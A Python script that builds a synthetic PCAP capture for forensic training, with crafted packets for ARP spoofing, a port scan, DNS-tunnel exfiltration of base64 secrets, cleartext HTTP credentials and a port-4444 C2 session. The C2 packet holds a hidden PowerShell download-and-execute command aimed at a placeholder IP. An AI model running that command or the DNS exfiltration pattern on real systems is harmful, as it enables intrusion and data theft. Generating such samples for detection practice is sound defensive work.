"""
NetPacket Inspector - Enhanced Malicious Traffic PCAP Generator
Generates a realistic multi-attack forensic PCAP capture containing port scans, DNS tunneling, cleartext credential leaks, ARP spoofing, and backdoor traffic.
"""

import struct
import time
import base64
from typing import List


def generate_forensic_attack_pcap(filepath: str):
    """Creates a rich PCAP containing multiple network attack vectors for forensic demonstration."""
    # Global Header
    global_hdr = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
    packets_data: List[bytes] = []

    attacker_mac = bytes.fromhex("000c29112233")
    victim_mac = bytes.fromhex("001122334455")
    gateway_mac = bytes.fromhex("00aabbccddee")
    fake_mac = bytes.fromhex("deadbeefcafe")

    attacker_ip = bytes([192, 168, 1, 100])
    victim_ip = bytes([192, 168, 1, 50])
    gateway_ip = bytes([192, 168, 1, 1])
    dns_server_ip = bytes([8, 8, 8, 8])
    c2_server_ip = bytes([198, 51, 100, 23])

    # 1. ARP Spoofing Attack (Fake MAC claiming Gateway IP)
    eth_arp_legit = victim_mac + gateway_mac + struct.pack("!H", 0x0806)
    arp_legit = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + gateway_mac + gateway_ip + victim_mac + victim_ip
    packets_data.append(eth_arp_legit + arp_legit)

    # Poisoned ARP (Attacker claiming Gateway IP)
    eth_arp_poison = victim_mac + fake_mac + struct.pack("!H", 0x0806)
    arp_poison = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + fake_mac + gateway_ip + victim_mac + victim_ip
    packets_data.append(eth_arp_poison + arp_poison)

    # 2. TCP SYN Port Scan (Attacker 192.168.1.100 scanning Victim on multiple ports)
    target_ports = [21, 22, 23, 80, 443, 445, 1433, 3306, 3389, 8080]
    for p_idx, dst_port in enumerate(target_ports):
        eth_scan = victim_mac + attacker_mac + struct.pack("!H", 0x0800)
        ip_scan = struct.pack("!BHHHBBH", 0, 40, 0x1000 + p_idx, 0x4000, 64, 6, 0)
        ip_hdr = bytes([0x45]) + ip_scan + attacker_ip + victim_ip
        tcp_syn = struct.pack("!HHIIHHHH", 50000 + p_idx, dst_port, 100000 + p_idx, 0, (5 << 12) | 0x0002, 65535, 0, 0)
        packets_data.append(eth_scan + ip_hdr + tcp_syn)

    # 3. DNS Tunneling & Data Exfiltration (Base64 secret exfiltrated via subdomain queries)
    secrets = [
        "dGhpcyBpcyBhbiBleGZpbHRyYXRlZCBwYXNzd29yZA",  # "this is an exfiltrated password"
        "YWRtaW46U3VwZXJTZWNyZXRLZXkyMDI2",          # "admin:SuperSecretKey2026"
        "c2VjcmV0X2ZpbmFuY2lhbF9yZXBvcnRfcGRm"        # "secret_financial_report_pdf"
    ]
    for s_idx, secret_b64 in enumerate(secrets):
        eth_dns = gateway_mac + attacker_mac + struct.pack("!H", 0x0800)
        full_query = f"{secret_b64}.exfil.covert-tunnel.org"
        
        # Build DNS query payload
        dns_labels = b""
        for part in full_query.split("."):
            dns_labels += bytes([len(part)]) + part.encode("ascii")
        dns_labels += b"\x00" + struct.pack("!HH", 1, 1)  # Type A, Class IN

        dns_header = struct.pack("!HHHHHH", 0x1337 + s_idx, 0x0100, 1, 0, 0, 0)
        udp_len = 8 + len(dns_header) + len(dns_labels)
        ip_len = 20 + udp_len
        ip_dns = bytes([0x45]) + struct.pack("!BHHHBBH", 0, ip_len, 0x2000 + s_idx, 0x4000, 64, 17, 0) + attacker_ip + dns_server_ip
        udp_hdr = struct.pack("!HHHH", 53000 + s_idx, 53, udp_len, 0)
        packets_data.append(eth_dns + ip_dns + udp_hdr + dns_header + dns_labels)

    # 4. HTTP Cleartext Credential Exfiltration (HTTP Basic Auth & POST Password)
    eth_http = gateway_mac + victim_mac + struct.pack("!H", 0x0800)
    
    # 4a. HTTP Basic Auth
    basic_auth_str = base64.b64encode(b"admin:CorporateSuperAdmin2026!").decode()
    http_req1 = f"GET /admin/dashboard HTTP/1.1\r\nHost: internal-portal.corp\r\nAuthorization: Basic {basic_auth_str}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode()
    ip_http1 = bytes([0x45]) + struct.pack("!BHHHBBH", 0, 20 + 20 + len(http_req1), 0x3001, 0x4000, 64, 6, 0) + victim_ip + c2_server_ip
    tcp_http1 = struct.pack("!HHIIHHHH", 49152, 80, 2000001, 5000001, (5 << 12) | 0x0018, 65535, 0, 0)
    packets_data.append(eth_http + ip_http1 + tcp_http1 + http_req1)

    # 4b. HTTP POST form password
    http_post = b"POST /login.php HTTP/1.1\r\nHost: internal-portal.corp\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 45\r\n\r\nusername=ceo_executive&password=VaultSecret9988!"
    ip_http2 = bytes([0x45]) + struct.pack("!BHHHBBH", 0, 20 + 20 + len(http_post), 0x3002, 0x4000, 64, 6, 0) + victim_ip + c2_server_ip
    tcp_http2 = struct.pack("!HHIIHHHH", 49153, 80, 2000500, 5000001, (5 << 12) | 0x0018, 65535, 0, 0)
    packets_data.append(eth_http + ip_http2 + tcp_http2 + http_post)

    # 5. Backdoor C2 Connection on Port 4444 (Reverse Shell Session)
    c2_payload = b"powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://198.51.100.23/c2.ps1'))\n"
    ip_c2 = bytes([0x45]) + struct.pack("!BHHHBBH", 0, 20 + 20 + len(c2_payload), 0x4001, 0x4000, 64, 6, 0) + victim_ip + c2_server_ip
    tcp_c2 = struct.pack("!HHIIHHHH", 49154, 4444, 3000001, 7000001, (5 << 12) | 0x0018, 65535, 0, 0)
    packets_data.append(eth_http + ip_c2 + tcp_c2 + c2_payload)

    # Write capture
    base_time = time.time() - 120
    with open(filepath, "wb") as f:
        f.write(global_hdr)
        for i, pkt in enumerate(packets_data):
            ts_sec = int(base_time + (i * 0.15))
            ts_usec = int((i * 150000) % 1000000)
            pkt_hdr = struct.pack("<IIII", ts_sec, ts_usec, len(pkt), len(pkt))
            f.write(pkt_hdr)
            f.write(pkt)

    print(f"[+] Successfully generated forensic attack capture with {len(packets_data)} packets: {filepath}")


# Alias for backward compatibility
generate_enhanced_malicious_sample = generate_forensic_attack_pcap


if __name__ == "__main__":
    generate_forensic_attack_pcap("forensic_attack_sample.pcap")
